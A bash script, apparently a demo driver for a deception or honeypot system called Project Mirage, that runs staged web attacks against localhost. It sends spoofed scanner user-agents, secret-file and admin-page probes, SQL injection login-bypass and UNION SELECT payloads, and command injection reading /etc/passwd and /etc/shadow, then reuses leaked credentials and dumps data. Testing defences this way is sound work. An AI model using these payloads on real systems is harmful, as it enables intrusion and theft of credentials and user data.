#!/bin/bash
# Project Mirage — Live Attack Simulation Script
# Run in a split terminal while watching the dashboard at http://localhost:3000

TARGET="http://localhost:8080"
SLEEP=1.5

bar() { echo ""; echo "═══════════════════════════════════════════════════════"; echo "  $1"; echo "═══════════════════════════════════════════════════════"; echo ""; }

bar "STAGE 1: PASSIVE RECONNAISSANCE — Scanner User-Agent"
sleep $SLEEP
curl -s -A "Nikto/2.1.6" "$TARGET/" -o /dev/null -w "HTTP %{http_code} ← nikto UA\n"
sleep 1
curl -s -A "sqlmap/1.8 (https://sqlmap.org)" "$TARGET/login" -o /dev/null -w "HTTP %{http_code} ← sqlmap UA\n"
sleep 1
curl -s -A "masscan/1.0 tbot/1.0" "$TARGET/" -o /dev/null -w "HTTP %{http_code} ← masscan UA\n"

bar "STAGE 2: PATH TRAVERSAL & ADMIN HUNTING"
sleep $SLEEP
echo "--- Trying /.env ---"
curl -v "$TARGET/.env" 2>&1 | grep -E "(< HTTP|DB_|SECRET|API_KEY|password)"
sleep 1
echo ""
echo "--- Trying /admin ---"
curl -s "$TARGET/admin/" | head -60
sleep 1
echo ""
echo "--- Trying /phpmyadmin ---"
curl -s "$TARGET/phpmyadmin" | head -40

bar "STAGE 3: SQL INJECTION ATTEMPTS"
sleep $SLEEP
echo "--- Login bypass ---"
curl -s -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=anything" | head -80
sleep 1
echo ""
echo "--- UNION SELECT probe ---"
curl -s "$TARGET/users?id=1+UNION+SELECT+username,password,3+FROM+users--" | head -80

bar "STAGE 4: COMMAND INJECTION"
sleep $SLEEP
curl -s -X POST "$TARGET/api/exec" \
  -H "Content-Type: application/json" \
  -d '{"cmd": "ls -la /etc/passwd"}' | head -60
sleep 1
curl -s "$TARGET/api/v1/users; cat /etc/shadow" | head -40

bar "STAGE 5: USING LEAKED CREDENTIALS (from .env)"
sleep $SLEEP
echo "--- Auth with leaked creds ---"
curl -s -X POST "$TARGET/api/v1/authenticate" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"Pr0d_S3cur3!"}' | head -80
sleep 1
echo ""
echo "--- Mass user dump ---"
curl -s "$TARGET/api/v1/users?page=1&limit=9999" | head -120

bar "STAGE 6: DATA EXFILTRATION SIMULATION"
sleep $SLEEP
curl -s "$TARGET/api/v1/admin/config" | head -60
sleep 1
curl -s "$TARGET/backup/db_dump.sql" | head -40

bar "SIMULATION COMPLETE — Check dashboard for DECEPTION_ENGAGED sessions"
echo ""
echo "→ Dashboard:  http://localhost:3000"
echo "→ API:        http://localhost:8000/api/sessions"
echo "→ Health:     http://localhost:8000/health"
echo ""
